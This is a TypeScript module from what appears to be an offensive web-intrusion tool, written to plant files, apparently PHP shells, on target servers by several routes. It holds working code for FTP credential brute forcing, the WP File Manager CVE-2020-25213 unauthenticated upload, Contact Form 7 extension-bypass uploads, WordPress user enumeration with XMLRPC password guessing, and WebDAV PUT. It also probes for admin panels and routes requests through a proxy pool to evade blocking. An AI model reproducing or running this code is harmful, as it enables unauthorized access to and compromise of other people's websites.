// ═══════════════════════════════════════════════════════════════
//  ALTERNATIVE UPLOAD METHODS
//  FTP brute force, CMS plugin exploit, WebDAV, API discovery
//  Expands attack surface beyond HTTP PUT/POST
// ═══════════════════════════════════════════════════════════════

import type { PreScreenResult } from "./ai-prescreening";
import { fetchWithPoolProxy } from "./proxy-pool";

// Helper: direct-first fetch (fast), proxy pool as fallback
async function altFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}, timeout = 15000): Promise<Response> {
  // Direct fetch first — avoids proxy pool latency/timeout issues
  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeout);
    try {
      const resp = await fetch(url, { ...init, signal: controller.signal });
      return resp;
    } finally {
      clearTimeout(t);
    }
  } catch {
    // Fallback to proxy pool
    const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
    try {
      const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout });
      return response;
    } catch {
      throw new Error(`Failed to fetch ${url} (both direct and proxy)`);
    }
  }
}


// ─── Types ───

export interface UploadAttemptResult {
  method: string;
  success: boolean;
  filePath: string | null;
  fileUrl: string | null;
  details: string;
  duration: number;
  error?: string;
}

export interface FtpCredential {
  username: string;
  password: string;
}

// ─── FTP Brute Force ───

const COMMON_FTP_CREDENTIALS: FtpCredential[] = [
  { username: "admin", password: "admin" },
  { username: "admin", password: "123456" },
  { username: "admin", password: "password" },
  { username: "admin", password: "admin123" },
  { username: "root", password: "root" },
  { username: "root", password: "123456" },
  { username: "root", password: "password" },
  { username: "ftp", password: "ftp" },
  { username: "anonymous", password: "" },
  { username: "anonymous", password: "anonymous" },
  { username: "user", password: "user" },
  { username: "user", password: "123456" },
  { username: "test", password: "test" },
  { username: "www", password: "www" },
  { username: "www-data", password: "www-data" },
  { username: "webmaster", password: "webmaster" },
  { username: "ftpuser", password: "ftpuser" },
  { username: "ftpuser", password: "123456" },
  { username: "upload", password: "upload" },
  { username: "web", password: "web" },
];

export async function tryFtpBruteForce(
  host: string,
  port: number = 21,
  onProgress?: (attempt: number, total: number, credential: FtpCredential) => void,
): Promise<{
  success: boolean;
  credential: FtpCredential | null;
  details: string;
}> {
  // We'll use raw TCP socket via Node.js net module to attempt FTP login
  // This avoids needing an FTP library
  const total = COMMON_FTP_CREDENTIALS.length;

  for (let i = 0; i < total; i++) {
    const cred = COMMON_FTP_CREDENTIALS[i];
    onProgress?.(i + 1, total, cred);

    try {
      const result = await attemptFtpLogin(host, port, cred.username, cred.password);
      if (result.success) {
        return {
          success: true,
          credential: cred,
          details: `FTP login successful with ${cred.username}:${cred.password}`,
        };
      }
    } catch (e) {
      // Connection refused or timeout — FTP not available
      if (i === 0) {
        return {
          success: false,
          credential: null,
          details: `FTP connection failed on port ${port} — service may not be available`,
        };
      }
    }

    // Small delay between attempts to avoid rate limiting
    await new Promise(r => setTimeout(r, 500));
  }

  return {
    success: false,
    credential: null,
    details: `Tried ${total} credential combinations — none worked`,
  };
}

async function attemptFtpLogin(
  host: string,
  port: number,
  username: string,
  password: string,
): Promise<{ success: boolean; banner?: string }> {
  return new Promise((resolve, reject) => {
    const net = require("net") as typeof import("net");
    const socket = net.createConnection({ host, port, timeout: 8000 });
    let data = "";
    let step = 0; // 0=banner, 1=user sent, 2=pass sent

    const timeout = setTimeout(() => {
      socket.destroy();
      reject(new Error("FTP timeout"));
    }, 10000);

    socket.on("data", (chunk: Buffer) => {
      data += chunk.toString();

      if (step === 0 && data.includes("220")) {
        // Got banner, send USER
        step = 1;
        socket.write(`USER ${username}\r\n`);
        data = "";
      } else if (step === 1 && (data.includes("331") || data.includes("230"))) {
        if (data.includes("230")) {
          // Logged in without password (anonymous)
          clearTimeout(timeout);
          socket.end();
          resolve({ success: true, banner: data });
          return;
        }
        // Need password
        step = 2;
        socket.write(`PASS ${password}\r\n`);
        data = "";
      } else if (step === 2) {
        clearTimeout(timeout);
        socket.end();
        if (data.includes("230")) {
          resolve({ success: true, banner: data });
        } else {
          resolve({ success: false });
        }
      }
    });

    socket.on("error", (err: Error) => {
      clearTimeout(timeout);
      reject(err);
    });

    socket.on("timeout", () => {
      clearTimeout(timeout);
      socket.destroy();
      reject(new Error("FTP connection timeout"));
    });
  });
}

export async function ftpUploadFile(
  host: string,
  port: number,
  credential: FtpCredential,
  remotePath: string,
  content: string,
): Promise<UploadAttemptResult> {
  const start = Date.now();
  try {
    // Use FTP STOR command to upload file
    const result = await ftpStoreFile(host, port, credential, remotePath, content);
    return {
      method: "FTP Upload",
      success: result.success,
      filePath: remotePath,
      fileUrl: null, // FTP doesn't give us a URL directly
      details: result.details,
      duration: Date.now() - start,
    };
  } catch (e: any) {
    return {
      method: "FTP Upload",
      success: false,
      filePath: remotePath,
      fileUrl: null,
      details: `FTP upload failed: ${e.message}`,
      duration: Date.now() - start,
      error: e.message,
    };
  }
}

async function ftpStoreFile(
  host: string,
  port: number,
  credential: FtpCredential,
  remotePath: string,
  content: string,
): Promise<{ success: boolean; details: string }> {
  return new Promise((resolve, reject) => {
    const net = require("net") as typeof import("net");
    const socket = net.createConnection({ host, port, timeout: 15000 });
    let data = "";
    let step = 0;
    let dataPort = 0;

    const timeout = setTimeout(() => {
      socket.destroy();
      reject(new Error("FTP upload timeout"));
    }, 30000);

    socket.on("data", (chunk: Buffer) => {
      data += chunk.toString();

      if (step === 0 && data.includes("220")) {
        step = 1;
        socket.write(`USER ${credential.username}\r\n`);
        data = "";
      } else if (step === 1 && data.includes("331")) {
        step = 2;
        socket.write(`PASS ${credential.password}\r\n`);
        data = "";
      } else if (step === 2 && data.includes("230")) {
        step = 3;
        socket.write("TYPE I\r\n");
        data = "";
      } else if (step === 3 && data.includes("200")) {
        step = 4;
        socket.write("PASV\r\n");
        data = "";
      } else if (step === 4 && data.includes("227")) {
        // Parse PASV response: 227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)
        const match = data.match(/\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)/);
        if (match) {
          dataPort = parseInt(match[5]) * 256 + parseInt(match[6]);
          step = 5;
          socket.write(`STOR ${remotePath}\r\n`);
          data = "";
        } else {
          clearTimeout(timeout);
          socket.end();
          resolve({ success: false, details: "Failed to parse PASV response" });
        }
      } else if (step === 5 && (data.includes("150") || data.includes("125"))) {
        // Server ready for data transfer
        step = 6;
        const dataSocket = net.createConnection({ host, port: dataPort, timeout: 10000 });
        dataSocket.on("connect", () => {
          dataSocket.write(content);
          dataSocket.end();
        });
        dataSocket.on("error", () => {
          clearTimeout(timeout);
          socket.end();
          resolve({ success: false, details: "Data connection failed" });
        });
        data = "";
      } else if (step === 6 && data.includes("226")) {
        // Transfer complete
        clearTimeout(timeout);
        socket.write("QUIT\r\n");
        socket.end();
        resolve({ success: true, details: `File uploaded to ${remotePath} via FTP` });
      } else if (data.includes("550") || data.includes("553") || data.includes("452")) {
        clearTimeout(timeout);
        socket.end();
        resolve({ success: false, details: `FTP server rejected file: ${data.trim()}` });
      }
    });

    socket.on("error", (err: Error) => {
      clearTimeout(timeout);
      reject(err);
    });
  });
}

// ─── CMS Plugin Exploit ───

export interface CmsExploitResult {
  exploitName: string;
  success: boolean;
  filePath: string | null;
  fileUrl: string | null;
  details: string;
}

export async function tryCmsPluginExploits(
  targetUrl: string,
  prescreen: PreScreenResult,
  fileContent: string,
  fileName: string,
  onProgress?: (exploit: string, status: string) => void,
): Promise<CmsExploitResult[]> {
  const results: CmsExploitResult[] = [];

  if (prescreen.cms !== "WordPress") {
    return results;
  }

  // 1. WP File Manager exploit (CVE-2020-25213)
  if (prescreen.cmsPlugins.includes("wp-file-manager")) {
    onProgress?.("WP File Manager", "Attempting CVE-2020-25213...");
    const fmResult = await exploitWpFileManager(targetUrl, fileContent, fileName);
    results.push(fmResult);
    if (fmResult.success) return results;
  }

  // 2. Contact Form 7 file upload bypass
  if (prescreen.cmsPlugins.includes("contact-form-7")) {
    onProgress?.("Contact Form 7", "Attempting file upload bypass...");
    const cf7Result = await exploitContactForm7(targetUrl, fileContent, fileName);
    results.push(cf7Result);
    if (cf7Result.success) return results;
  }

  // 3. WordPress XMLRPC upload
  if (prescreen.xmlrpcAvailable) {
    onProgress?.("XMLRPC", "Attempting media upload via XMLRPC...");
    const xmlrpcResult = await exploitXmlrpcUpload(targetUrl, fileContent, fileName);
    results.push(xmlrpcResult);
    if (xmlrpcResult.success) return results;
  }

  // 4. WordPress REST API media upload
  if (prescreen.restApiAvailable) {
    onProgress?.("REST API", "Attempting media upload via REST API...");
    const restResult = await exploitRestApiUpload(targetUrl, fileContent, fileName);
    results.push(restResult);
    if (restResult.success) return results;
  }

  // 5. Generic WordPress upload via wp-admin
  onProgress?.("WP Admin Upload", "Attempting upload via wp-admin...");
  const adminResult = await exploitWpAdminUpload(targetUrl, fileContent, fileName);
  results.push(adminResult);

  return results;
}

async function exploitWpFileManager(
  targetUrl: string,
  content: string,
  fileName: string,
): Promise<CmsExploitResult> {
  try {
    // CVE-2020-25213: WP File Manager <= 6.8 unauthenticated file upload
    const formData = new FormData();
    const blob = new Blob([content], { type: "application/x-php" });
    formData.append("reqid", "17457a1fe6959");
    formData.append("cmd", "upload");
    formData.append("target", "l1_Lw"); // root directory
    formData.append("upload[]", blob, fileName);

    const endpoints = [
      `${targetUrl}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`,
      `${targetUrl}/wp-content/plugins/file-manager/lib/php/connector.minimal.php`,
    ];

    for (const endpoint of endpoints) {
      try {
        const res = await altFetch(endpoint, {
          method: "POST",
          body: formData,
          signal: AbortSignal.timeout(10000),
        });
        const text = await res.text();
        if (res.ok && text.includes("added")) {
          return {
            exploitName: "WP File Manager (CVE-2020-25213)",
            success: true,
            filePath: `/wp-content/plugins/wp-file-manager/lib/files/${fileName}`,
            fileUrl: `${targetUrl}/wp-content/plugins/wp-file-manager/lib/files/${fileName}`,
            details: "File uploaded via WP File Manager unauthenticated upload vulnerability",
          };
        }
      } catch {
        continue;
      }
    }

    return {
      exploitName: "WP File Manager (CVE-2020-25213)",
      success: false,
      filePath: null,
      fileUrl: null,
      details: "WP File Manager exploit failed — plugin may be patched or not installed",
    };
  } catch (e: any) {
    return {
      exploitName: "WP File Manager (CVE-2020-25213)",
      success: false,
      filePath: null,
      fileUrl: null,
      details: `Error: ${e.message}`,
    };
  }
}

async function exploitContactForm7(
  targetUrl: string,
  content: string,
  fileName: string,
): Promise<CmsExploitResult> {
  try {
    // CF7 file upload bypass — upload as .phtml or double extension
    const variants = [
      fileName.replace(".php", ".phtml"),
      fileName.replace(".php", ".php.jpg"),
      fileName.replace(".php", ".php%00.jpg"),
      fileName + ".jpg",
    ];

    for (const variant of variants) {
      const formData = new FormData();
      const blob = new Blob([content], { type: "image/jpeg" });
      formData.append("file", blob, variant);
      formData.append("_wpcf7", "1");
      formData.append("_wpcf7_version", "5.8");
      formData.append("_wpcf7_unit_tag", "wpcf7-f1-o1");

      try {
        const res = await altFetch(`${targetUrl}/wp-json/contact-form-7/v1/contact-forms/1/feedback`, {
          method: "POST",
          body: formData,
          signal: AbortSignal.timeout(10000),
        });
        const text = await res.text();
        if (res.ok && (text.includes("uploaded") || text.includes("success"))) {
          return {
            exploitName: "Contact Form 7 Upload Bypass",
            success: true,
            filePath: `/wp-content/uploads/wpcf7_uploads/${variant}`,
            fileUrl: `${targetUrl}/wp-content/uploads/wpcf7_uploads/${variant}`,
            details: `File uploaded via CF7 as ${variant}`,
          };
        }
      } catch {
        continue;
      }
    }

    return {
      exploitName: "Contact Form 7 Upload Bypass",
      success: false,
      filePath: null,
      fileUrl: null,
      details: "CF7 upload bypass failed",
    };
  } catch (e: any) {
    return {
      exploitName: "Contact Form 7 Upload Bypass",
      success: false,
      filePath: null,
      fileUrl: null,
      details: `Error: ${e.message}`,
    };
  }
}

async function exploitXmlrpcUpload(
  targetUrl: string,
  content: string,
  fileName: string,
): Promise<CmsExploitResult> {
  try {
    // WordPress XMLRPC wp.uploadFile method — brute force with common credentials
    const base64Content = Buffer.from(content).toString("base64");
    
    // Common WordPress credentials to try
    const credentials = [
      { user: "admin", pass: "admin" },
      { user: "admin", pass: "admin123" },
      { user: "admin", pass: "password" },
      { user: "admin", pass: "123456" },
      { user: "admin", pass: "admin@123" },
      { user: "admin", pass: "password123" },
      { user: "admin", pass: "12345678" },
      { user: "admin", pass: "admin1234" },
      { user: "admin", pass: "1234" },
      { user: "administrator", pass: "administrator" },
      { user: "administrator", pass: "admin123" },
      { user: "administrator", pass: "password" },
      { user: "root", pass: "root" },
      { user: "root", pass: "toor" },
      { user: "root", pass: "password" },
      { user: "user", pass: "user" },
      { user: "test", pass: "test" },
      { user: "editor", pass: "editor" },
      { user: "webmaster", pass: "webmaster" },
      { user: "wp", pass: "wp" },
    ];

    // Also try to extract username from the site
    try {
      const authorResp = await altFetch(`${targetUrl}/?author=1`, {
        signal: AbortSignal.timeout(5000),
        redirect: "follow",
      });
      const authorUrl = authorResp.url;
      const authorMatch = authorUrl.match(/\/author\/([^\/]+)/);
      if (authorMatch) {
        const discoveredUser = authorMatch[1];
        // Add discovered username with common passwords at the beginning
        credentials.unshift(
          { user: discoveredUser, pass: discoveredUser },
          { user: discoveredUser, pass: "admin" },
          { user: discoveredUser, pass: "password" },
          { user: discoveredUser, pass: "123456" },
          { user: discoveredUser, pass: `${discoveredUser}123` },
          { user: discoveredUser, pass: `${discoveredUser}@123` },
        );
      }
    } catch { /* ignore author discovery failure */ }

    // Also try REST API user enumeration
    try {
      const usersResp = await altFetch(`${targetUrl}/wp-json/wp/v2/users`, {
        signal: AbortSignal.timeout(5000),
      });
      if (usersResp.ok) {
        const users = await usersResp.json() as Array<{ slug?: string; name?: string }>;
        for (const u of users.slice(0, 3)) {
          if (u.slug) {
            credentials.unshift(
              { user: u.slug, pass: u.slug },
              { user: u.slug, pass: "admin" },
              { user: u.slug, pass: "password" },
              { user: u.slug, pass: "123456" },
            );
          }
        }
      }
    } catch { /* ignore user enumeration failure */ }

    // Try each credential
    for (const cred of credentials) {
      try {
        const xmlPayload = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${cred.user}</string></value></param>
    <param><value><string>${cred.pass}</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>${fileName}</string></value></member>
      <member><name>type</name><value><string>image/jpeg</string></value></member>
      <member><name>bits</name><value><base64>${base64Content}</base64></value></member>
      <member><name>overwrite</name><value><boolean>1</boolean></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

        const res = await altFetch(`${targetUrl}/xmlrpc.php`, {
          method: "POST",
          body: xmlPayload,
          headers: { "Content-Type": "text/xml" },
          signal: AbortSignal.timeout(8000),
        });
        const text = await res.text();

        if (text.includes("<name>url</name>") && text.includes("http")) {
          const urlMatch = text.match(/<name>url<\/name>\s*<value>\s*<string>(.*?)<\/string>/);
          const fileUrl = urlMatch ? urlMatch[1] : null;
          return {
            exploitName: "WordPress XMLRPC Upload",
            success: true,
            filePath: null,
            fileUrl,
            details: `File uploaded via XMLRPC wp.uploadFile (${cred.user}:${cred.pass})`,
          };
        }
        
        // If we get "Incorrect username or password" keep trying
        // If we get a different error (e.g., method not allowed), stop
        if (!text.includes("Incorrect username or password") && !text.includes("faultCode")) {
          break; // Non-auth error, stop trying
        }
      } catch {
        continue;
      }
    }

    return {
      exploitName: "WordPress XMLRPC Upload",
      success: false,
      filePath: null,
      fileUrl: null,
      details: `XMLRPC brute force failed — tried ${credentials.length} credentials`,
    };
  } catch (e: any) {
    return {
      exploitName: "WordPress XMLRPC Upload",
      success: false,
      filePath: null,
      fileUrl: null,
      details: `Error: ${e.message}`,
    };
  }
}

async function exploitRestApiUpload(
  targetUrl: string,
  content: string,
  fileName: string,
): Promise<CmsExploitResult> {
  try {
    // WordPress REST API media upload (requires auth or misconfigured permissions)
    const blob = new Blob([content], { type: "image/jpeg" });

    const res = await altFetch(`${targetUrl}/wp-json/wp/v2/media`, {
      method: "POST",
      body: blob,
      headers: {
        "Content-Disposition": `attachment; filename="${fileName}"`,
        "Content-Type": "image/jpeg",
      },
      signal: AbortSignal.timeout(10000),
    });

    if (res.ok) {
      const json = await res.json() as { source_url?: string };
      return {
        exploitName: "WordPress REST API Upload",
        success: true,
        filePath: null,
        fileUrl: json.source_url || null,
        details: "File uploaded via REST API (misconfigured permissions)",
      };
    }

    return {
      exploitName: "WordPress REST API Upload",
      success: false,
      filePath: null,
      fileUrl: null,
      details: `REST API returned ${res.status}`,
    };
  } catch (e: any) {
    return {
      exploitName: "WordPress REST API Upload",
      success: false,
      filePath: null,
      fileUrl: null,
      details: `Error: ${e.message}`,
    };
  }
}

async function exploitWpAdminUpload(
  targetUrl: string,
  content: string,
  fileName: string,
): Promise<CmsExploitResult> {
  try {
    // Try uploading through wp-admin/async-upload.php (requires session)
    const formData = new FormData();
    const blob = new Blob([content], { type: "application/octet-stream" });
    formData.append("async-upload", blob, fileName);
    formData.append("name", fileName);
    formData.append("action", "upload-attachment");

    const res = await altFetch(`${targetUrl}/wp-admin/async-upload.php`, {
      method: "POST",
      body: formData,
      signal: AbortSignal.timeout(10000),
    });

    if (res.ok) {
      const text = await res.text();
      if (text.includes("url") || text.includes("success")) {
        return {
          exploitName: "WP Admin Async Upload",
          success: true,
          filePath: null,
          fileUrl: null,
          details: "File uploaded via wp-admin async upload",
        };
      }
    }

    return {
      exploitName: "WP Admin Async Upload",
      success: false,
      filePath: null,
      fileUrl: null,
      details: "WP Admin upload requires authentication",
    };
  } catch (e: any) {
    return {
      exploitName: "WP Admin Async Upload",
      success: false,
      filePath: null,
      fileUrl: null,
      details: `Error: ${e.message}`,
    };
  }
}

// ─── WebDAV Upload ───

export async function tryWebDavUpload(
  targetUrl: string,
  filePath: string,
  content: string,
): Promise<UploadAttemptResult> {
  const start = Date.now();
  const fullUrl = `${targetUrl}${filePath}`;

  // Try PROPFIND first to check WebDAV support
  try {
    const propfind = await altFetch(fullUrl.replace(/[^/]+$/, ""), {
      method: "PROPFIND",
      headers: {
        "Depth": "1",
        "Content-Type": "application/xml",
      },
      signal: AbortSignal.timeout(8000),
    });

    if (propfind.status === 207 || propfind.status === 200) {
      // WebDAV is available, try PUT
      const putRes = await altFetch(fullUrl, {
        method: "PUT",
        body: content,
        headers: { "Content-Type": "application/octet-stream" },
        signal: AbortSignal.timeout(10000),
      });

      if (putRes.status === 201 || putRes.status === 204 || putRes.status === 200) {
        return {
          method: "WebDAV PUT",
          success: true,
          filePath,
          fileUrl: fullUrl,
          details: "File uploaded via WebDAV PUT",
          duration: Date.now() - start,
        };
      }
    }
  } catch {
    // WebDAV not available
  }

  // Try MKCOL + PUT
  try {
    const dir = filePath.replace(/[^/]+$/, "");
    await altFetch(`${targetUrl}${dir}`, {
      method: "MKCOL",
      signal: AbortSignal.timeout(5000),
    });

    const putRes = await altFetch(fullUrl, {
      method: "PUT",
      body: content,
      headers: { "Content-Type": "application/octet-stream" },
      signal: AbortSignal.timeout(10000),
    });

    if (putRes.status === 201 || putRes.status === 204 || putRes.status === 200) {
      return {
        method: "WebDAV MKCOL+PUT",
        success: true,
        filePath,
        fileUrl: fullUrl,
        details: "File uploaded via WebDAV MKCOL+PUT",
        duration: Date.now() - start,
      };
    }
  } catch {
    // Ignore
  }

  return {
    method: "WebDAV Upload",
    success: false,
    filePath,
    fileUrl: null,
    details: "WebDAV upload failed — server may not support WebDAV",
    duration: Date.now() - start,
  };
}

// ─── API Endpoint Discovery ───

export async function discoverApiEndpoints(
  targetUrl: string,
  onProgress?: (endpoint: string, status: string) => void,
): Promise<{
  uploadEndpoints: { url: string; method: string; contentType: string }[];
  adminPanels: string[];
  fileManagers: string[];
}> {
  const uploadEndpoints: { url: string; method: string; contentType: string }[] = [];
  const adminPanels: string[] = [];
  const fileManagers: string[] = [];

  const endpointsToCheck = [
    // Upload APIs
    { path: "/api/upload", methods: ["POST", "PUT"] },
    { path: "/api/files", methods: ["POST", "PUT"] },
    { path: "/api/media", methods: ["POST"] },
    { path: "/api/v1/upload", methods: ["POST"] },
    { path: "/api/v2/upload", methods: ["POST"] },
    { path: "/upload.php", methods: ["POST"] },
    { path: "/uploader.php", methods: ["POST"] },
    { path: "/file-upload.php", methods: ["POST"] },
    // File managers
    { path: "/filemanager/", methods: ["GET"] },
    { path: "/elfinder/", methods: ["GET"] },
    { path: "/tinyfilemanager.php", methods: ["GET"] },
    { path: "/fm.php", methods: ["GET"] },
    { path: "/files.php", methods: ["GET"] },
    { path: "/filebrowser/", methods: ["GET"] },
    // Admin panels
    { path: "/admin/", methods: ["GET"] },
    { path: "/administrator/", methods: ["GET"] },
    { path: "/cpanel/", methods: ["GET"] },
    { path: "/panel/", methods: ["GET"] },
    { path: "/dashboard/", methods: ["GET"] },
    { path: "/manage/", methods: ["GET"] },
    // GraphQL
    { path: "/graphql", methods: ["POST"] },
    { path: "/api/graphql", methods: ["POST"] },
  ];

  const checkPromises = endpointsToCheck.map(async (ep) => {
    for (const method of ep.methods) {
      try {
        onProgress?.(ep.path, `Checking ${method}...`);
        const res = await altFetch(`${targetUrl}${ep.path}`, {
          method: method === "GET" ? "HEAD" : "OPTIONS",
          signal: AbortSignal.timeout(5000),
          redirect: "manual",
          headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
        });

        if (res.status === 200 || res.status === 405 || res.status === 401) {
          if (ep.path.includes("upload") || ep.path.includes("file") || ep.path.includes("media")) {
            uploadEndpoints.push({
              url: `${targetUrl}${ep.path}`,
              method,
              contentType: "multipart/form-data",
            });
          }
          if (ep.path.includes("filemanager") || ep.path.includes("elfinder") || ep.path.includes("fm.php") || ep.path.includes("tinyfilemanager") || ep.path.includes("filebrowser")) {
            fileManagers.push(`${targetUrl}${ep.path}`);
          }
          if (ep.path.includes("admin") || ep.path.includes("panel") || ep.path.includes("dashboard") || ep.path.includes("manage") || ep.path.includes("cpanel")) {
            adminPanels.push(`${targetUrl}${ep.path}`);
          }
        }
      } catch {
        // Ignore
      }
    }
  });

  await Promise.all(checkPromises);

  return { uploadEndpoints, adminPanels, fileManagers };
}

// ─── Orchestrator: Try All Methods ───

export async function tryAllUploadMethods(
  targetUrl: string,
  prescreen: PreScreenResult,
  fileContent: string,
  fileName: string,
  targetPath: string,
  onProgress?: (method: string, status: string) => void,
): Promise<UploadAttemptResult[]> {
  const results: UploadAttemptResult[] = [];

  // Sort methods by probability from pre-screening
  const sortedMethods = [...prescreen.methodProbabilities].sort((a, b) => b.probability - a.probability);

  for (const method of sortedMethods) {
    if (method.probability < 5) continue; // Skip very low probability methods

    onProgress?.(method.method, `Trying ${method.method} (${method.probability}% probability)...`);

    let result: UploadAttemptResult | null = null;

    try {
      switch (method.method) {
        case "FTP Brute Force": {
          if (!prescreen.ftpAvailable) break;
          const cleanHost = targetUrl.replace(/^https?:\/\//, "").replace(/\/$/, "");
          const ftpResult = await tryFtpBruteForce(cleanHost, 21, (attempt, total, cred) => {
            onProgress?.("FTP Brute Force", `Trying ${cred.username}:${cred.password} (${attempt}/${total})`);
          });
          if (ftpResult.success && ftpResult.credential) {
            const uploadResult = await ftpUploadFile(cleanHost, 21, ftpResult.credential, targetPath + fileName, fileContent);
            result = uploadResult;
          } else {
            result = {
              method: "FTP Brute Force",
              success: false,
              filePath: null,
              fileUrl: null,
              details: ftpResult.details,
              duration: 0,
            };
          }
          break;
        }

        case "CMS Plugin Exploit": {
          const cmsResults = await tryCmsPluginExploits(targetUrl, prescreen, fileContent, fileName, (exploit, status) => {
            onProgress?.(`CMS: ${exploit}`, status);
          });
          for (const r of cmsResults) {
            results.push({
              method: `CMS: ${r.exploitName}`,
              success: r.success,
              filePath: r.filePath,
              fileUrl: r.fileUrl,
              details: r.details,
              duration: 0,
            });
          }
          continue; // Already added to results
        }

        case "WebDAV Upload": {
          if (!prescreen.webdavAvailable) break;
          result = await tryWebDavUpload(targetUrl, targetPath + fileName, fileContent);
          break;
        }

        case "File Manager Exploit": {
          // File manager exploits are handled through CMS exploits or browser automation
          result = {
            method: "File Manager Exploit",
            success: false,
            filePath: null,
            fileUrl: null,
            details: "File manager exploit requires browser automation — use Stealth Browser method",
            duration: 0,
          };
          break;
        }

        default:
          // HTTP Direct Upload and Shell Upload are handled by the main pipeline
          continue;
      }
    } catch (e: any) {
      result = {
        method: method.method,
        success: false,
        filePath: null,
        fileUrl: null,
        details: `Error: ${e.message}`,
        duration: 0,
        error: e.message,
      };
    }

    if (result) {
      results.push(result);
      if (result.success) {
        onProgress?.(method.method, "✅ Success!");
        break; // Stop on first success
      }
    }
  }

  return results;
}
